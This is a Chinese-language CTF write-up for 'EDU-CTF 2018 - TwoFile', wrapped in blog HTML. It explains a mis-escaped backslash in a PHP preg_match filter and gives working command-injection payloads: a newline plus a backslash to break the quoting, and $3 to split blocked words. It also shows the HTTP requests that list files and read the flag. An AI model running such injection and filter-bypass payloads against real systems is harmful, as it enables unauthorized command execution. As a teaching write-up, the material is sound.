@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.0.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.woolninesun.org","root":"/","scheme":"Gemini","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false};
+  </script>
+
+  <meta name="description" content="這題目寫起來很有趣，反斜線看到時覺得好像有問題，卻過一小時後才去確認有沒有問題，前面都在找其他的洞，非常失策">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EDU-CTF 2018 - TwoFile">
+<meta property="og:url" content="https://blog.woolninesun.org/posts/efa4e0df/index.html">
+<meta property="og:site_name" content="奈尚羊毛">
+<meta property="og:description" content="這題目寫起來很有趣，反斜線看到時覺得好像有問題，卻過一小時後才去確認有沒有問題，前面都在找其他的洞，非常失策">
+<meta property="og:locale">
+<meta property="article:published_time" content="2019-01-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-01-31T16:00:00.000Z">
+<meta property="article:author" content="WooLNinesun">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.woolninesun.org/posts/efa4e0df/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh'
+  };
+</script>
+
+  <title>EDU-CTF 2018 - TwoFile | 奈尚羊毛</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <main class="main">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+        <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">奈尚羊毛</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">願如同童話裡的山羊般咀嚼知識</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-首頁">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首頁</a>
+
+  </li>
+        <li class="menu-item menu-item-文章">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>文章</a>
+
+  </li>
+        <li class="menu-item menu-item-分類">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分類</a>
+
+  </li>
+        <li class="menu-item menu-item-關於">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>關於</a>
+
+  </li>
+        <li class="menu-item menu-item-留言">
+
+    <a href="/comments/" rel="section"><i class="fa fa-comments fa-fw"></i>留言</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <section class="post-toc-wrap sidebar-panel">
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%AD%A3%E6%96%87"><span class="nav-number">1.</span> <span class="nav-text">[正文]</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Analysis"><span class="nav-number">1.1.</span> <span class="nav-text">Analysis</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Escape-backslash-in-PHP"><span class="nav-number">1.1.1.</span> <span class="nav-text">Escape backslash in PHP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Payload"><span class="nav-number">1.2.</span> <span class="nav-text">Payload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%9B%E8%A1%8C%E7%AC%A6%E8%99%9F"><span class="nav-number">1.2.1.</span> <span class="nav-text">換行符號</span></a></li></ol></li></ol></li></ol></div>
+      </section>
+      <!--/noindex-->
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="WooLNinesun"
+      src="/uploads/avatar.png">
+  <p class="site-author-name" itemprop="name">WooLNinesun</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/woolninesun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;woolninesun" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:WooLNinesun+blog@gmail.com" title="E-Mail → mailto:WooLNinesun+blog@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </section>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </header>
+
+      
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div id="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+      <div class="main-inner">
+        
+
+        <div class="content post posts-expand">
+          
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
+    <link itemprop="mainEntityOfPage" href="https://blog.woolninesun.org/posts/efa4e0df/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.png">
+      <meta itemprop="name" content="WooLNinesun">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="奈尚羊毛">
+    </span>
+
+    
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          EDU-CTF 2018 - TwoFile
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-02-01 00:00:00" itemprop="dateCreated datePublished" datetime="2019-02-01T00:00:00+08:00">2019-02-01</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Capture-The-Flag/" itemprop="url" rel="index"><span itemprop="name">Capture The Flag</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Capture-The-Flag/EDU-CTF-2018/" itemprop="url" rel="index"><span itemprop="name">EDU-CTF 2018</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>這題目寫起來很有趣，反斜線看到時覺得好像有問題，卻過一小時後才去確認有沒有問題，前面都在找其他的洞，非常失策</p>
+<a id="more"></a>
+
+<h1 id="正文"><a href="#正文" class="headerlink" title="[正文]"></a>[正文]</h1><p>題目有給 source code</p>
+<figure class="highlight js"><figcaption><span>source code</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$file1 = $_GET[<span class="string">&quot;f1&quot;</span>];</span><br><span class="line">$file2 = $_GET[<span class="string">&quot;f2&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// WAF</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|cat|sh|flag|find|grep|echo|w/is&quot;</span>, $file1))</span><br><span class="line">  $file1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|cat|sh|flag|find|grep|echo|w/is&quot;</span>, $file2))</span><br><span class="line">  $file2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Prevent injection</span></span><br><span class="line">$file1 = <span class="string">&#x27;&quot;&#x27;</span> . $file1 . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$file2 = <span class="string">&#x27;&quot;&#x27;</span> . $file2 . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$cmd = <span class="string">&quot;file $file1 $file2&quot;</span>;</span><br><span class="line">system($cmd);</span><br></pre></td></tr></table></figure>
+
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><ol>
+<li><p>觀察 source code，發現在最後會用 system 去執行 <code>file $file1 $file2</code>，且 <code>$file1</code>，<code>$file2</code>的內容會被雙引號包住來防止 injection，如果可以繞過 WAF 和雙引號，就可以控制 system 的內容！</p>
+</li>
+<li><p>觀察 WAF，可以發現在 preg_match 的 regular expression 中有反斜線的漏洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// WAF</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|cat|sh|flag|find|grep|echo|w/is&quot;</span>, $file1))</span><br><span class="line">  $file1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|cat|sh|flag|find|grep|echo|w/is&quot;</span>, $file2))</span><br><span class="line">  $file2 = <span class="string">&quot;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>可以看到反斜線的 escape 為 <code>\\</code>，但是在 php 中要 escape 反斜線要四個 <code>\\\\</code>，這個錯誤會引發後面的 <code>\n</code> 也會出錯，<code>\\|\n</code> 在 string  escape 變成 <code>\|\n</code>，導致在 preg_match 中要 <code>|\n</code> 才會被 match 到。這樣就可以使用 <mark class="label primary">反斜線</mark> 和 <mark class="label primary">換行符號</mark>！</p>
+<div class="note info"><h3 id="Escape-backslash-in-PHP"><a href="#Escape-backslash-in-PHP" class="headerlink" title="Escape backslash in PHP"></a>Escape backslash in PHP</h3><p>根據 <a target="_blank" rel="noopener" href="http://php.net/manual/en/regexp.reference.escape.php">PHP Manual</a> 的說明，PHP 在建構 string 時會先 escape 反斜線一次，所以要表示一個反斜線，會變成 <code>\\</code>，在 preg_match 中 pattern 又會在 escape，所以會變成 <code>\\\\</code> 才能成功過濾反斜線。</p>
+</div>
+
+</li>
+</ol>
+<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>知道可以使用反斜線和換行符號，那可以嘗試使用反斜線去 escape 雙引號，換行符號 (%0a) 來讓 system 以為有兩行命令 </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$file1 = \</span><br><span class="line">$file2 = %<span class="number">0</span>als\</span><br><span class="line"></span><br><span class="line">$cmd = <span class="string">&quot;file &quot;</span>\<span class="string">&quot; &quot;</span>%<span class="number">0</span>als\<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// string escape, $cmd =&gt;</span></span><br><span class="line"><span class="string">&quot;file &quot;</span><span class="string">&quot; &quot;</span></span><br><span class="line">ls<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<div class="note warning"><h3 id="換行符號"><a href="#換行符號" class="headerlink" title="換行符號"></a>換行符號</h3><p>這裡使用 <code>%0a</code> 當換行符號，主要是因為傳資料的時候會經過 http，會被 urlencode，%0a 就是 url 中的urlencode 換行符號，另外就是 %0a 本來就不會被 preg_match 批配到換行字元。</p>
+</div>
+
+<p>WAF pattern 的後半段有 <code>ls|cat|sh|flag|find|grep|echo|w</code>，這些簡單地用 $3 來 bypass 就好，例如 <code>ls</code> ==&gt; <code>l$3s</code></p>
+<figure class="highlight plain"><figcaption><span>Http request</span></figcaption><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;final.kaibro.tw:10002&#x2F;</span><br><span class="line"></span><br><span class="line"># cmd: ls .</span><br><span class="line">GET f1&#x3D;\ f2&#x3D;%0al$3s%20.%20\</span><br><span class="line">&quot; : cannot open &#96;&quot; &#39; (No such file or directory) .: flag index.php</span><br><span class="line"></span><br><span class="line"># cmd: ls flag</span><br><span class="line">GET f1&#x3D;\ f2&#x3D;%0al$3s%20fl$3ag%20\</span><br><span class="line">&quot; : cannot open &#96;&quot; &#39; (No such file or directory) flag: flag_15_here.txt</span><br><span class="line"></span><br><span class="line"># cmd: cat flag_15_here.txt</span><br><span class="line">GET f1&#x3D;\ f2&#x3D;%0ac$3at%20fl$3ag&#x2F;fl$3ag_15_here.txt%20\</span><br><span class="line">&quot; : cannot open &#96;&quot; &#39; (No such file or directory) FLAG&#123;e4sy_w4f_byp4s5_0h_y4_XD__&#125;</span><br></pre></td></tr></table></figure>
+
+<p>FLAG: <code>FLAG&#123;e4sy_w4f_byp4s5_0h_y4_XD__&#125;</code></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>WooLNinesun
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://blog.woolninesun.org/posts/efa4e0df/" title="EDU-CTF 2018 - TwoFile">https://blog.woolninesun.org/posts/efa4e0df/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/php/" rel="tag"># php</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/582cd6cc/" rel="prev" title="Insomni'hack teaser 2019 - phunk2">
+      <i class="fa fa-chevron-left"></i> Insomni'hack teaser 2019 - phunk2
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/1d24c795/" rel="next" title="EDU-CTF 2018 - HackerTyper">
+      EDU-CTF 2018 - HackerTyper <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+        </div>
+        
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">WooLNinesun</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
